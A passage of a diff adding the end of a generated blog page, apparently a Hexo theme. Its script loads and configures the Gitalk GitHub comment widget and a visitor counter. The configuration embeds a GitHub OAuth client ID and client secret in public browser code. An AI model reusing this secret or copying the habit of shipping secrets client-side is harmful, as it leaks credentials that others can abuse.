+  ele.rel = 'stylesheet'
+  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
+  document.getElementsByTagName('head')[0].appendChild(ele)
+}
+
+function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: '4d4ce5b3f76f792bdfeb',
+      clientSecret: '8ac446a390aaa101275b309e475ee975a3e56751',
+      repo: 'blog',
+      owner: 'xinyuan-404',
+      admin: ['xinyuan-404'],
+      id: '7fdc79079b0e1bc836f511fa8c2ad94a',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    addGitalkSource()
+    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.innerHTML= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !true) {
+  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
